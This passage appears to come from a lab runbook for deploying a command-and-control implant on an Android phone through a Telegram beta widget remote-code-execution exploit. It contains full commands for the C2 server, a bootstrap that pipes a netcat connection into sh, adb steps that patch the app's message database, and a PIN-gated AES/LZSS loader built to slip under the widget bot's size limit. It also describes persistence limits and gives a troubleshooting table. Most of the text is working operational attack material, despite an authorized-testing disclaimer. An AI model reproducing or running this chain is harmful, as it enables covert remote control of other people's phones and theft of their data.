| `DIAG_WATCHDOG stage=kill` in `diag.out` | the diag exceeded 25 s; the last trace stage is where it wedged |
| trace stops mid-stage and only resumes when Telegram is foregrounded | the cached-app freezer froze the UID cgroup; keep Telegram foreground, this is a platform limit |

Add `--diag-xtrace` to the server command for a full `set -x` trace in
`diag.trace` (it contains the hello/token; the file is app-private):

```sh
python3 server/c2_server.py --host <LAN_IP> --allow-lan \
  --port 4444 --loader-port 5555 --token NIGHT4 \
  --bootstrap-diag --diag-xtrace
```

The diag session closes immediately; that is expected. Then stop the diag
server (Ctrl-C or `quit`).

### 5.3 Start the full server and install

```sh
python3 server/c2_server.py \
  --host <LAN_IP> --allow-lan \
  --port 4444 --loader-port 5555 \
  --token NIGHT4
```

Re-arm the bundle once (or let the chat re-render once). Expected:

```
[..] loader: serving 38xxx bytes to <LAN_IP>
[..] session 1 hello implant=tg-10357-<model> uid=10357 user=u0_a357 device=<model> pid=... build=<hex> from=<LAN_IP>
[+] session 1: tg-10357-<model> (u0_a357@<model>) from <LAN_IP>
>>> sessions
>>> exec id
uid=10357(u0_a357) gid=10357(u0_a357) ...
```

`<model>` is `getprop ro.product.model` with spaces mapped to `_` (for example
`XQ-BT52`). The id is only metadata; `sessions` and `build=` are what matter.

The loader may still be fetched by several widget engines. That is expected:
the first fetch installs; the rest print `C2_ALREADY_RUNNING` or
`C2_BOOTSTRAP_BUSY` in the phone-side stdout and do **not** create sessions.
The server should log exactly one `hello` for this build. If it logs
`C2_ALREADY_RUNNING`-era sessions repeatedly, do not re-arm again; check
`sessions` and the `build=` value.

### 5.4 Path A: local DB patch (Sony, root/ADB, no size limit)

This is the path for the Sony; it is also how the prior widgets were installed.
No bot size limit applies.

```sh
# 0. pull the DB first (root/ADB on the Sony)
adb pull /data/data/org.telegram.messenger.beta/files/cache4.db cache4.db

# 1. patch the v2 payload's endgame command
python3 tools/patch_payload.py \
  --input  ../lab/qjs_postsnapshot/widget_poc_1865_universal_v2.html \
  --output /tmp/opencode/poc_c2.html \
  --command "setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc <LAN_IP> 5555|sh' &" \
  --limit 0          # local DB patch: the 4088-byte bot limit does not apply

# 2. install it into the message that carries the widget (mid 79415/79449
#    on the lab phone: check the current DB)
python3 ../tools/widget_tool.py cache4.db 79415 --html /tmp/opencode/poc_c2.html

# 3. stop the app, push the DB, drop stale WAL/SHM, restart, open the chat
adb shell am force-stop org.telegram.messenger.beta
adb push cache4.db /data/data/org.telegram.messenger.beta/files/cache4.db
adb shell rm -f /data/data/org.telegram.messenger.beta/files/cache4.db-wal \
                 /data/data/org.telegram.messenger.beta/files/cache4.db-shm
adb shell monkey -p org.telegram.messenger.beta 1
# open the chat with the widget: the exploit runs and calls system()
```

The server log shows `loader: serving ...` and then
`session N hello implant=...`, `exec`, `put`, `get`, `bye`.

### 5.5 Path B: official/beta widget bot (PIN, 4 KiB zlib limit)

The bot enforces `INPUT_MEDIA_WIDGET_TOO_LARGE` on `zlib.compress(html, 9)`
with header `0x78da`: **4,088 bytes accepted, 4,188 rejected; limit 4,096**.
The full v2 HTML is about 4.1 KB zlib on its own; the bot accepts a *loader*
HTML, and wrapping the full v2 script does not fit. Use the compact
device-tested payload (`conservative_min.js`, 3,632 B) that the 4 KiB loader
was built from:

```sh
# 1. swap the proof command for the C2 bootstrap (the JS is one line: the
#    tool finds the single `var cmd="...";` occurrence)
python3 tools/patch_payload.py \
  --input  ../lab/qjs_postsnapshot/loaders/size_variants/payloads/conservative_min.js \
  --output /tmp/opencode/payload_c2.js \
  --command "setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc <LAN_IP> 5555|sh' &"

# 2. wrap with the device-proven LZSS/AES PIN loader (PIN 19111998).
#    This reuses lab/.../size_variants/ (AES-128-CTR + LZSS + canvas keypad +
#    atob + indirect eval): it does not modify the research directory.
python3 tools/make_loader_4096.py \
  --payload /tmp/opencode/payload_c2.js --pin 19111998 \
  --output /tmp/opencode/loader_c2.html
# bakes: zlib-9 3,740 B, 348 B under 4,088

# 3. re-check the bot metric yourself (must be <= 4088: 4,096 is the hard limit)
python3 - <<'PY'
import zlib
d = open('/tmp/opencode/loader_c2.html','rb').read()
print(len(d), len(zlib.compress(d, 9)))
assert len(zlib.compress(d, 9)) <= 4088
PY
```

Send `loader_c2.html` through the beta widget bot, open the widget on the
phone, enter PIN `19111998`, press OK. The loader decrypts/evals the exploit,
which calls `system()` with the bootstrap; the detached pipeline installs and
starts the C2. The PIN is in the filename only; treat the loader as sensitive
(RC4/AES with a short PIN is obfuscation, not strong confidentiality).

### 5.6 Verify, stop, restart

```sh
# verify
sessions
use <sid>
exec id; getprop ro.product.model
ping

# clean stop: ack, stop marker, implant + supervisor exit
bye stop

# server side
quit
```

If the session is already gone and you have a shell/adb fallback:

```sh
adb shell 'for f in sup.pid implant.pid; do \
  [ -f /data/user/0/org.telegram.messenger.beta/files/.c2/$f ] && \
  kill $(cat /data/user/0/org.telegram.messenger.beta/files/.c2/$f); done'
```

`bye` without `stop` closes the socket and the implant reconnects after the
delay. Re-running the bootstrap is idempotent: it kills the old
supervisor/implant (via their pid files) and starts fresh.

## 6. Persistence limits (read this before claiming anything)

* **App crash: survives.** The pipeline is `setsid`'d and the implant is not
  a child of the app process; this is the same mechanism the reverse-shell PoC
  used. The supervisor restarts a dead implant.
* **`am force-stop`: does NOT survive.** Android 13 kills the whole UID/cgroup,
  including `setsid` children and the supervisor. This was measured on this
  device (`notes/persistence_20261101.md`): the watcher vanished and did not
  reconnect after the restart; the same script as root survived. There is no
  non-root workaround on one app UID; this is a platform limit, not a script
  bug.
* **Reboot: nothing persists.** There is no init/`wrap.<pkg>`/`LD_PRELOAD`
  hook. A reboot requires re-running the widget RCE.
* **App UID only.** Only `/data/user/0/org.telegram.messenger.beta` and the
  app's network are reachable. No other package, no `/data/system`, no root.
* **Cached-app freezer.** Android 11+ may freeze the app's UID cgroup when
  Telegram is backgrounded. `setsid` changes the session, not the cgroup, so
  the C2 and its supervisor freeze with the app and resume when it is
  foregrounded. Keep Telegram foreground during the diag/device test; this is
  a platform limit, not a script bug.
* **One-shot entry.** Each `system()` call is one exploit run; the C2 is what
  stays alive afterwards, not the widget.
* **Network is LAN-only.** The server never relays; if the host IP changes,
  re-render the bootstrap and re-run the RCE. `adb reverse` is a lab transport,
  not part of this C2.
* **Widget sandbox wall (~5 s).** The bootstrap backgrounds the pipeline
  immediately, so the sandbox can die without taking the C2 with it.
* **Large transfer vs dead server.** A blocking FIFO write can wedge `nc`;
  the supervisor kills a stale implant after `C2_STALE` (120 s) and restarts
  it. Keep transfers to the app's own files and use `get`/`put`, not a raw
  shell stream, for large data.
* **Loader port trust.** Anyone who can reach the loader port can download the
  bootstrap (and the token in it). Trusted LAN only; firewall the port when
  not deploying.
* **Use only on devices you own or are explicitly authorized to test.**

## 7. Troubleshooting

| symptom | check |
|---|---|
| `DIAG_CONNECT_FAIL` | no TCP to the control port: host/port, LAN, `ss -ltn`; the loader worked, so only `--port`/token/address differ |
| `DIAG_NO_REPLY` | hello went out but no `welcome`: server older than this revision, token mismatch, or the control socket closed early; check the server log for `hello`/`bad token` |
| `diag.trace` stops in `cn-*` | the last stage names the failing open/start; table in §5.2 |
| `DIAG_WATCHDOG stage=kill` | the diag wedged >25 s; the last trace stage is where |
| trace stops and resumes only when Telegram is foregrounded | cached-app freezer (UID cgroup); keep the app foreground; platform limit |
| `stage=write rc!=0` | `$D/.c2` not writable by the app UID; check `stage=dir` |
| `C2_ALREADY_RUNNING` / `C2_BOOTSTRAP_BUSY` | expected on repeated widget boots/chat scrolling; the first install is alive. Do not re-arm; `sessions` is authoritative |
| loader log says `serving`, no `hello` | run the diag (§5.2) first; then check the storm/build pair and `diag.out`; phone→host TCP or an old server would also show this |
| `hello` repeatedly arrives with different `build=` | an old C2 is being replaced; let the fetch finish, then `sessions`; do not loop the re-arm |
| `hello` rejected `bad token` | server `--token` differs from the rendered command; re-run `make_bootstrap.py` and re-patch |
| implant exits immediately | `implant.out`/`implant.log`: unrendered `__C2_HOST__`, or `/system/bin/toybox` missing (use the mock only on hosts) |
| `nc` connected but no script | the command lost the `sleep 2|` prefix: toybox `nc` exits on stdin EOF |
| bot rejects the widget | `zlib.compress(loader,9) > 4088`; rebuild the compact loader, check the number before sending |
| after `am force-stop` nothing reconnects | expected; re-run the widget RCE; see §6 |
| supervisor restarts in a loop | `sup.log`; a missing `implant.sh` or a wrong `C2_DIR`; a stale `sup.lock` is removed automatically |
| `get` sha mismatch | file changed during transfer, or a partial chunk; retry; the server keeps `.part` only on write failure |

## 8. References

* `../REPORT_COMPLETE.md`; widget sandbox, `system()` RCE, device proof.
* `../notes/reverse_shell_poc.md`; detached `setsid` + FIFO transport and the
  `am force-stop` addendum.
* `../notes/persistence_20261101.md`; UID/cgroup force-stop measurement.
* `../notes/aes_tiny_loader_72799.md`; PIN 19111998, zlib 4,088/4,096 bot limit,
  the 3,735-byte device-tested loader.
* `../tools/widget_tool.py`; local `cache4.db` widget patch.
* `tools/make_loader_4096.py`; rebuilds the LZSS/AES 4 KiB loader from a
  patched payload (imports the research builder; needs `cryptography` on the
  build host only).  `../tools/make_loader_aes.py` remains the generic
  deflate/AES wrapper.

The server and implant were validated only on the host (`run_local_test.sh`,
74 checks). No phone or emulator was run for this C2; the device run is the
next step and should start from §5.2.
